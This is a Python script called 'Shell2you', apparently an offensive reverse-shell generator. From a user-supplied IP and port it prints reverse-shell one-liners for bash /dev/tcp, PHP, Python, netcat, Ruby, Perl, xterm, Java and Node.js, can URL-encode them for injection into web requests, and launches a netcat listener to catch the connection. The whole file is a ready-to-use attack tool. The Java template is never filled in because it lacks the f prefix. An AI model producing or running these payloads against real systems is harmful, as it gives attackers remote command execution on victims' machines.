#!/usr/bin/python3

import socket
import urllib.parse
import shlex
import os

red = "\033[1;31m"
green = "\033[1;32m"
purple = "\033[1;35m"
blue = "\033[1;34m"
reset = "\033[0;m"
yellow = "\033[1;33m"

def menu():
    print(red + '|-----------------------------|' + reset)
    print(red + '|   Welcome to Shell2you!     |' + reset)
    print(red + '|       Dev By Be4St          |' + reset)
    print(red + '|-----------------------------|' + reset + "\n")

def validate_ip(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except socket.error:
        return False

def validate_port(port):
    try:
        port = int(port)
        return 0 < port < 65536
    except ValueError:
        return False

def get_ip_and_port():
    while True:
        ip = input("Enter IP address: ")
        port = input("Enter port: ")

        if validate_ip(ip) and validate_port(port):
            return ip, port
        else:
            print("Invalid IP or port. Please enter valid values.")

def encode_shell(shell_type, ip, port):
    match shell_type:
        case '1':
            return f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
        case '2':
            return f'php -r \'$sock=fsockopen("{ip}", {port});exec("/bin/sh -i <&3 >&3 2>&3");\''
        case '3':
            return f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
        case '4':
            return f'nc -e /bin/sh {ip} {port}'
        case '5':
            return f'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
        case '6':
            return f'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''
        case '7':
            return f'xterm -display {ip}:{port}'
        case '8':
            return 'r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]);p.waitFor()'
        case '9':
            return f'require("child_process").exec("nc -e bash {ip} {port}")'
        case _:
            return None
    
def get_user_choice():
    while True:
        choice = input(f"{yellow}[?]{reset} Do you want to encode the shell? (y/n): ").lower()
        if choice in ['y', 'n']:
            return choice
        print("Invalid choice. Please enter 'y' or 'n'.")

def get_encoded_shell(shell_type, ip, port,encode_choice):
    rshell = encode_shell(shell_type, ip, port)
    if rshell is not None:
        if encode_choice == 'y':
            return rshell, shlex.quote(rshell)
        else:
            return rshell, None
    else:
        return None, None

def print_encoded_shell(rshell, escaped_shell):
    if escaped_shell is not None:
        print(f"\n{purple}[+] Encoded shell:{reset} {urllib.parse.quote(escaped_shell)}\n")
    else:
        print(f"\n{green}[+] Shell: {reset}{rshell}\n")

def print_all_encoded_shells(ip, port, encode_choice):
        print('\n' + blue + '-' * 27 +f'\nShells for {ip}:{port}\n' + '-' * 27 + reset)
        for i in ['1', '2', '3', '4', '5', '6', '7', '8', '9','10']:
            rshell, escaped_shell = get_encoded_shell(i, ip, port, encode_choice)
            print_encoded_shell(rshell, escaped_shell)
        listen = input(f"{yellow}[?]{reset} Listen with netcat? (y/n): ")
        if listen == 'y':
            print(f"\n{green}[+]{reset} Listener: \n")
            os.system("nc -lvnp " + port)
        else:
            print(f"\n{red}[-]{reset} Back to menu ... ")

def open_netcat(port):
    try:
        print(f"\n{green}[+]{reset} Listener: \n")
        os.system("nc -lvnp " + port)
    except Exception as e:
        print(f"Error: {e}")

def main():
    menu()
    ip, port = get_ip_and_port()

    while True:
        print("\n1.Bash - 2.PHP - 3.Python - 4.Netcat - 5. Ruby - 6.Perl - 7.Xterm - 8.Java - 9.Node.js - 10.All - 11.Quit")
        choice = input("\nEnter your choice [1-11]: ")

        if choice == '11':
            print("Quitting the program.")
            break
        elif choice in ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10']:
            encode_choice = get_user_choice()
            if choice == '10':
                print_all_encoded_shells(ip, port, encode_choice)
            else:
                rshell, escaped_shell = get_encoded_shell(choice, ip, port, encode_choice)
                print_encoded_shell(rshell, escaped_shell)
                open_netcat(port)
        else:
            print(f"{red}[-]{reset} Invalid choice. Please enter a number between 1 and 11." + "\n")

if __name__ == "__main__":
    main()
